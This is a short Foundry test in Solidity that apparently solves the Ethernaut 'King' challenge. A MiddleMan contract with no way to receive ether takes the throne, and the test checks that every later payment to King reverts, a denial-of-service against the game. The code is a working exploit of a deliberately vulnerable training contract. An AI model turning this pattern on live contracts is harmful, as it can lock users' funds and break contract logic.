// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/King.sol";

contract MiddleMan {
    function callKing(address king) public payable {
        king.call{value: msg.value}("");
    }
}

contract KingTest is Test {
    King king;

    function setUp() public {
        vm.prank(msg.sender);
        king = new King{value: 0.001 ether}();
    }

    function test() public {
        assertEq(king.king(), msg.sender);

        MiddleMan middleMan = new MiddleMan();

        // somehow needs to transfer > the original amount in practice
        middleMan.callKing{value: 0.002 ether}(address(king));
        assertEq(king.king(), address(middleMan));

        vm.expectRevert();
        address(king).call{value: 0.001 ether}("");
    }
}
